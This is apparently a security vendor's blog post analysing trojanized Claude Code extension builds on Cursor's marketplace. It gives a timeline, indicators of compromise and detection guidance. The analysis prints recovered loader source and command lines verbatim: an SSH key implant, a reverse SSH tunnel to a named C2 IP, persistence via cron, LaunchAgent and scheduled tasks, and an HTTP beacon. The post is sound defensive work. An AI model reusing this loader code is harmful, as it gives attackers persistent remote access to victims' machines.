@@ -1,0 +1,665 @@
+Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines - StepSecurity
+
+Skip to main content
+
+Platform
+
+Platform Overview
+
+Dev Machine Guard
+
+Code Repo Security
+
+Secure Registry
+
+CI/CD Security
+
+Threat Intel
+
+Customers
+
+Pricing
+
+Resources
+
+Blog
+
+Product Tour
+
+Dev Machine Guard on GitHub
+
+Harden Runner on GitHub
+
+GitHub Actions Audit
+
+Documentation
+
+Company
+
+About Us
+
+Newsroom
+
+Trust Center
+
+Request a Demo
+
+Login
+
+Platform
+
+Platform Overview
+
+Dev Machine Guard
+
+Code Repo Security
+
+Secure Registry
+
+CI/CD Security
+
+Threat Intel
+
+Customers
+
+Pricing
+
+Resources
+
+Blog
+
+Product Tour
+
+Dev Machine Guard on GitHub
+
+Harden Runner on GitHub
+
+GitHub Actions Audit
+
+Documentation
+
+Company
+
+About Us
+
+Newsroom
+
+Trust Center
+
+Start Free
+
+Login
+
+Back to Blog
+
+Threat Intel
+
+Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines
+
+On October 29, 2026, trojanized builds (2.1.312 and 2.1.313) of the official Claude Code VS Code extension were published to Cursor's VS Code Extension Marketplace for macOS and Windows.
+
+Rohan Prabhu
+
+View LinkedIn
+
+October 30, 2026
+
+Share on X
+
+Share on X
+
+Share on LinkedIn
+
+Share on Facebook
+
+Follow our RSS feed
+
+Table of Contents
+
+Loading nav...
+
+On October 29, 2026, versions 2.1.312 and 2.1.313 of the Claude Code VS Code extension,
+anthropic.claude-code
+, were published to Cursor's VS Code Extension Marketplace for macOS and Windows carrying a malicious loader embedded in its
+extension.js
+bundle.
+
+Update (October 30, 2026):
+Anthropic has clarified the scope of this incident. Per
+Felix Rieseberg of Anthropic
+, this was not a compromise of Anthropic's systems or employee laptops. A malicious actor used access to Cursor's marketplace to publish a tampered copy of the Claude Code extension, which Anthropic did not build or publish. The versions on Anthropic's official channels are not affected, and this only impacts Cursor users. Anthropic has also
+confirmed
+that 2.1.313 was never published to Open-VSX, the Microsoft Visual Studio Marketplace, or any of its official hosts, and that it skipped to 2.1.314 to avoid confusion. We have corrected the sections below, which previously described Open-VSX as the origin and implied the build had been removed from the Microsoft Marketplace.
+
+Update (October 30, 2026, 11:30 am PT):
+Separately, Cursor's notice identifies malicious builds of both 2.1.312 and 2.1.313 in its marketplace for Windows and macOS. The 2.1.312 build served by Open-VSX is a different artifact: we downloaded and verified it clean. Exposure therefore covers Cursor users who installed 2.1.312 or 2.1.313 from Cursor's marketplace during the window.
+
+The malicious build is the official extension in every respect except one:
+extension.js
+carries a small self-contained loader embedded in the legitimate bundle. The malicious file (SHA-256
+ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15
+, 3,692,922 bytes) is roughly 7 KB larger than the preceding clean release, and sandbox telemetry shows the payload executes under plain Node.js with no VS Code APIs: loading the extension module is enough. No Claude conversation is needed, and no package-manager lifecycle hooks are involved. This was not an Anthropic release: the build repackages the official extension, and per Cursor's notice the malicious version was not developed by Anthropic.
+
+CHECK WHETHER YOU ARE IMPACTED:
+Having
+anthropic.claude-code
+2.1.312 or 2.1.313 installed does not, by itself, mean your machine is compromised.
+Cursor's notice
+scopes exposure to macOS and Windows users who downloaded either version from Cursor's marketplace through installation or an update between
+2:27 a.m. and 1:35 p.m. PT on October 29, 2026 (09:27–20:35 UTC)
+. Verify the download source and timing, then follow the
+Remediation steps below
+to check for impact and clean up affected hosts.
+
+Background: the extension and Cursor's marketplace
+
+The Claude Code VS Code extension is Anthropic's official IDE integration. This incident involved tampered copies of versions 2.1.312 and 2.1.313 distributed through
+Cursor's VS Code Extension Marketplace
+for macOS and Windows, under the legitimate extension identifier.
+
+According to
+Anthropic
+, a malicious actor used access to Cursor's marketplace to publish the tampered extension. Anthropic did not build or publish it, and its systems, employee laptops, and official distribution channels were not compromised in this incident.
+
+Having version 2.1.312 or 2.1.313 installed does not, by itself, confirm compromise. Check the download source, time window, and host indicators described below.
+
+Attack flow
+
+By Oct 29, ~09:27 UTC
+
+Malicious 2.1.312 and 2.1.313 builds available in Cursor's VS Code Extension Marketplace for macOS and Windows (2:27am PT, per Cursor)
+
+Oct 29, 09:27 to 20:35 UTC
+
+Download window for 2.1.312 and 2.1.313 from Cursor's marketplace on macOS and Windows (2:27am–1:35pm PT on October 29); at most 5,000 Cursor users received it (Cursor's initial figure)
+
+Oct 29, 20:35 UTC (1:35pm PT)
+
+Cursor removes the malicious builds and takes its marketplace fully offline; later audits find no other extensions tampered with; keys rotated
+
+Oct 30
+
+The C2 at 134.209.82.225 is taken offline with the cooperation of its hosting provider, per Cursor
+
+Inside the loader: recovered source analysis
+
+Update (November 1, 2026):
+we recovered the malicious
+extension.js
+sample (from MalwareBazaar, hash-verified against the anchor above) and completed a full static analysis of the embedded loader. The sample was never executed; everything in this section comes from reading the recovered source, cross-checked against the sandbox telemetry already cited.
+
+The tampering is a pure prepend. The malicious file is the clean Open-VSX 2.1.312
+extension.js
+with a single 7,386-byte loader IIFE spliced in front: after the loader, all 3,656,941 remaining bytes are identical to the clean 2.1.312 bundle we independently downloaded (3,692,922 = 3,685,536 + 7,386 exactly). There is no second backdoor deeper in the 3.6 MB bundle, and every indicator string in the IoC table below lives inside those first 7 KB. Two further consequences: the bundle inside the "2.1.313" VSIX still self-identifies as
+version:"2.1.312"
+(the bumped number existed only in the repackaged manifest), and the attacker demonstrably worked from the official 2.1.312 build artifact.
+
+The loader is not obfuscated at all: it is machine-minified JavaScript with plaintext constants, and the only encoding anywhere is standard base64 wrapping the tunnel private key. That is also why the fleet-sweep grep works. On load it runs six stages, each wrapped in a swallowing
+try/catch
+that records a status string instead of failing:
+
+Recon.
+Builds a JSON object with hostname, username, platform, CPU arch, home and working directories, the output of
+git config --global user.email
+, and the
+names
+(never values) of up to 40 environment variables matching
+/KEY|TOKEN|SECRET|PASS|AWS|GCP/i
+. The name list tells the operator which credentials exist on the machine without transmitting them over plain HTTP.
+
+SSH key implant.
+Appends the
+svc-telemetry
+Ed25519 key to
+~/.ssh/authorized_keys
+unless the marker is already present (making the implant idempotent), fixing permissions to 700/600.
+
+Enable SSH.
+Linux:
+systemctl enable --now sshd
+with three fallbacks. macOS:
+sudo -n systemsetup -setremotelogin on
+, which succeeds only where passwordless sudo is configured. Windows: installs the OpenSSH.Server capability and starts
+sshd
+.
+
+Reverse tunnel.
+Drops the base64-decoded tunnel key at
+$TMPDIR/.stk_
++
+md5(hostname + home)
+truncated to 10 hex chars (a name derived from the host, so the same machine always produces the same file), then loops
+ssh -N -R '*:0:localhost:22'
+to
+tunnel@134.209.82.225
+every 60 seconds, preferring
+autossh
+when installed. The remote port of
+0
+lets the server assign the listener, and
+BatchMode
+,
+StrictHostKeyChecking=no
+, and
+UserKnownHostsFile=/dev/null
+keep it silent and prompt-free.
+
+Persistence
+(the
+~/.config/.smt
+script re-derives its own key copy, so it survives temp-dir cleanup): Linux installs a cron
+@reboot
+entry; macOS writes the
+com.apple.sysmond
+LaunchAgent with
+RunAtLoad
+and
+KeepAlive
+; Windows tries a
+SysMon
+scheduled task running as SYSTEM (elevated sessions only) and falls back to copying
+sysmon.cmd
+into the Startup folder.
+
+Beacon.
+After 1.5 seconds, resolves the public IP via
+ifconfig.me
+(fallback
+api.ipify.org
+) and POSTs the JSON to
+:8099/beacon
+on both
+127.0.0.1
+and the C2.
+
+Recovered source, key constants and tunnel loop (verbatim, reformatted for reading; strings and identifiers are unchanged from the sample):
+
+var
+PUB =
+'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry'
+;
+var
+TUNKEY =
+'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...'
+;
+// base64 Ed25519 private key
+var
+TUNHOST =
+'134.209.82.225'
+;
+var
+TUNUSER =
+'tunnel'
+;
+var
+d = {
+host
+: os.hostname(),
+user
+: os.userInfo().username,
+platform
+: PLAT,
+arch
+: process.arch,
+home
+: HOME,
+cwd
+: process.cwd(),
+envKeys
+:
+Object
+.keys(process.env)
+.filter(
+function
+(
+k
+)
+{
+return
+/KEY|TOKEN|SECRET|PASS|AWS|GCP/i
+.test(k);
+})
+.slice(
+0
+,
+40
+),
+};
+// tunnel loop (macOS/Linux branch; Windows uses a hidden PowerShell while-loop)
+var
+o =
+" -N -R '*:0:localhost:22' -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
++
+' -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes'
++
+' -o ConnectTimeout=10 -o BatchMode=yes -o IdentitiesOnly=yes -i "'
++
+kf +
+'" '
++
+TUNUSER +
+'@'
++
+TUNHOST;
+det(
+'while true; do if command -v autossh >/dev/null 2>&1; then autossh -M 0'
++
+o +
+'; else ssh'
++
+o +
+'; fi; sleep 60; done >/dev/null 2>&1 &'
+,
+);
+// beacon, 1.5 s after load
+post(
+'127.0.0.1'
+,
+8099
+);
+post(TUNHOST,
+8099
+);
+
+The beacon doubles as a per-stage status report: alongside the recon fields it carries
+sshKey: added|present
+,
+sshd
+/
+remoteLogin
+state,
+tunnel: started|running
+, and
+persist: cron|launchd|schtasks|startup
+, so the operator sees, per victim, exactly which persistence mechanism took hold. Notably absent from the source: no credential values are read, no Claude or VS Code data is touched, and there is no second-stage download. The loader's entire capability is persistent SSH ingress plus a reconnaissance report; the real risk to an exposed machine is what the operator did, or could have done, through interactive access via the
+svc-telemetry
+key while the tunnel was up. Remediation guidance and the full indicator set are in the sections below.
+
+Indicators of Compromise
+
+Type
+
+Value
+
+Significance
+
+Potentially affected versions
+
+anthropic.claude-code@2.1.312
+and
+anthropic.claude-code@2.1.313
+
+Version alone does not confirm impact; verify download source, timing, and host indicators
+
+C2
+
+134.209.82.225
+
+Reverse tunnel (TCP 22, user tunnel) and HTTP beacon (8099); now offline
+
+Beacon
+
+http://134.209.82.225:8099/beacon
+
+POST of host recon JSON
+
+Local beacon attempt
+
+127.0.0.1:8099/beacon
+(HTTP POST, loopback)
+
+Loopback beacon attempt by the loader
+
+SSH key (authorized_keys)
+
+SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk
+, comment svc-telemetry
+
+Interactive access implant
+
+SSH key (tunnel identity)
+
+SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ
+
+Embedded private key dropped as
+.stk_
+<
+10 hex>
+
+Malicious VSIX 2.1.312 (darwin-arm64)
+
+fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364
+(MD5
+e0d64d53e802a0217ba6f0e656ed2f20
+)
+
+Per Cursor
+
+Malicious VSIX 2.1.312 (win32-x64)
+
+3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081
+(MD5
+bd3b71ddf3d0cc3af76249afd2c0eda1
+)
+
+Per Cursor
+
+Malicious VSIX 2.1.313 (darwin-arm64)
+
+80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c
+(MD5
+34e491161e056c9b899a79b602ac73b9
+)
+
+Per Cursor
+
+Malicious VSIX 2.1.313 (win32-x64)
+
+6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731
+(MD5
+7838a3be2ca0ff08c1bdb160ef516d39
+)
+
+Per Cursor
+
+Malicious extension.js
+
+sha256
+ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15
+(MD5
+f49bcd657ef1e626e85ce858958c1769
+)
+
+3,692,922 bytes; preserved on VirusTotal; verified by us; common to all four malicious VSIXs per Cursor
+
+On-disk detection
+
+extension folders
+anthropic.claude-code-2.1.312-*
+/
+-2.1.313-*
+(darwin-arm64, win32-x64):
+extension.js
+contains
+134.209.82.225
+and
+svc-telemetry
+
+Fleet sweep: grep installed extension bundles for either string
+
+Dropped smt.cmd
+
+22f682d9ff55264e934d0f43fcfbb46d58be5cfb8fe1b3a7cbb38fe089c818b0
+
+Windows persistence script, 330 bytes
+
+Dropped tunnel key
+
+7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278
+
+Written as
+.stk_
+<
+10 hex>
+
+Modified authorized_keys
+
+49d616941deb44840dc89061c617ad7a325aa32113819ddc14e9c8dc238c83d1
+
+Post-implant hash
+
+File paths
+
+~/.config/.smt, ~/.config/.smtk, ~/.config/smt.cmd, $TMPDIR/.stk_
+<
+10 hex>, ~/Library/LaunchAgents/com.apple.sysmond.plist, %USERPROFILE%\.ssh\authorized_keys, %USERPROFILE%\.config\smt.cmd, %TEMP%\.stk_
+<
+10 hex>, %APPDATA%\...\Startup\sysmon.cmd
+
+Persistence and key artifacts
+
+Scheduled objects
+
+task
+SysMon
+(SYSTEM, onstart), LaunchAgent
+com.apple.sysmond
+, cron
+@reboot
+
+Persistence
+
+Process / command-line
+
+ssh -N -R '*:0:localhost:22', autossh -M 0 (StrictHostKeyChecking=no, UserKnownHostsFile=/dev/null, ServerAliveInterval=30, IdentitiesOnly=yes), schtasks /create /tn SysMon, systemsetup -setremotelogin on, Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
+Tunnel, persistence, and enablement
+
+Not indicators on their own:
+ifconfig.me
+and
+api.ipify.org
+are legitimate public-IP services, and sandbox telemetry showed connections to ordinary Microsoft infrastructure; access alone does not indicate compromise.
+
+Remediation
+
+These steps apply to Claude Code extension versions 2.1.312 and 2.1.313 on macOS and Windows. Having either version installed does not, by itself, mean your machine is compromised. Check whether you downloaded or updated the extension from Cursor's VS Code Extension Marketplace between 2:27 a.m. and 1:35 p.m. PT on October 29, 2026 (09:27–20:35 UTC), then check for evidence of impact.
+
+For the exact check commands and remediation scripts, see
+Cursor's official security notice
+.
+
+How StepSecurity Helps
+
+Threat Center
+
+StepSecurity Enterprise customers
+can visit the
+Threat Center
+for the complete alert on this incident, including the full IOC set, affected version details, and the machines in their organization that installed
+anthropic.claude-code
+2.1.313.
+
+Dev Machine Guard
+
+Extension Inventory and Version-Based Alerts
+
+StepSecurity Dev Machine Guard
+flags
+anthropic.claude-code
+versions 2.1.312 and 2.1.313 as malicious on developer machines. This is version-level intelligence: an alert identifies a machine to investigate, not confirmed impact. For installations of 2.1.312 or 2.1.313, use the download window and
+Remediation checks above
+to determine whether the machine is affected.
+
+Malicious File Detection
+
+Dev Machine Guard’s
+Malicious Files
+feature provides another way to identify the compromised extension on developer machines. StepSecurity has deployed the
+cursor-claude-code-extension-backdoor
+scanning rule to detect the malicious
+extension.js
+file shipped in the trojanized Claude Code versions 2.1.312 and 2.1.313 distributed through Cursor’s marketplace.
+
+The screenshot below shows the rule detecting the compromised extension on a developer machine by matching the file’s SHA-256 hash against the known malicious payload. The finding includes the affected device, file path, and matching evidence, helping security teams identify installations containing the malicious file and prioritize remediation.
+
+StepSecurity maintains these detection rules centrally and applies them automatically across enrolled developer machines, with no additional configuration required.
+
+Dev Machine Guard detects the malicious Claude Code extension.js file and displays the affected device and SHA-256 match.
+
+References
+
+Cursor: security notice on Anthropic.claude-code 2.1.312 and 2.1.313
+
+Hacker News: Felix Rieseberg (Anthropic) on incident scope
+
+Hacker News: David Dworken (Anthropic) on unaffected official distribution
+
+Blog
+
+Explore Related Posts
+
+‍
+
+Binance’s $6.3 Billion Hack: FBI Attribution and the Case for Developer Machine Security
+
+The FBI has attributed Binance’s $6 billion-plus theft to North Korea’s TraderTraitor activity. As investigators work to establish the full intrusion sequence, the incident highlights why developer machines with access to critical systems need dedicated security controls.
+
+Ashish Kurmi
+
+View LinkedIn
+
+October 30, 2026
+
+Read
+
+Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines
+
+On October 29, 2026, trojanized builds (2.1.312 and 2.1.313) of the official Claude Code VS Code extension were published to Cursor's VS Code Extension Marketplace for macOS and Windows.
+
+Rohan Prabhu
+
+View LinkedIn
+
+October 30, 2026
+
+Read
+
+GitHub Actions Native Egress Firewall vs. Harden-Runner: Five Differences That Matter
+
+GitHub’s native egress firewall covers GitHub-hosted Linux runners. See five ways Harden-Runner goes further, from anomaly detection to build tampering
+
+Varun Sharma
+
+View LinkedIn
+
+October 28, 2026
+
+Read
+
+LinkedIn
+
+Github
+
+X
+
+Request a Demo
+
+Start Free
+
+System Status
+Trust Center
+
+Docs
+Pricing
+
+Contact Us
+Product Tour
+
+© 2026 All rights reserved
+
+Privacy Policy
+
+Terms of Service
+
+Our first annual report: The State of Open Source Supply Chain Attacks. Read it →
